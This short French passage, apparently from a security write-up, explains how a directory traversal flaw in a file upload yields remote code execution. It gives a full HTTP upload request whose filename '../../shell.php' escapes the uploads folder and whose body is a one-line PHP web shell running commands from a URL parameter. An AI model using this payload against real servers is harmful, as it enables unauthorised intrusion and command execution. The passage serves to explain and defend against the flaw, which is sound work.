Une exécution de code est possible en utilisant ces deux vulnérabilités combinées, au niveau de l'upload du fichier.

En effet, en fonction de la configuration de l'application web, on peut utiliser le `directory traversal` pour modifier le chemin de fin du fichier, c'est-a-dire que, le fichier ajouté peut finir avec la place  `/config/exploit.php` au lieu de se retrouver a l'endroit `/uploads/icons/exploit.php` attendu.

Par exemple, dans cette de requête HTTP:
```
POST /endpoint/ HTTP/2
Host: example.com
Accept-Language: fr-FR,fr;q=0.9
boundary=----bound1234567890
Accept: */*
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
------bound1234567890
Content-Disposition: form-data; name="avatar"; filename="../../shell.php"
Content-Type: application/x-php

<?php system($_GET["cmd"]); ?>
```
Un fichier `shell.php` est ajouté. La notation "../../" est propre au directory traversal, et permet d'échapper le dossier de base, et atteindre un dossier où tous les fichiers doivent être exécutés.

Ainsi, on peut obtenir un webshell.(aka RCE)
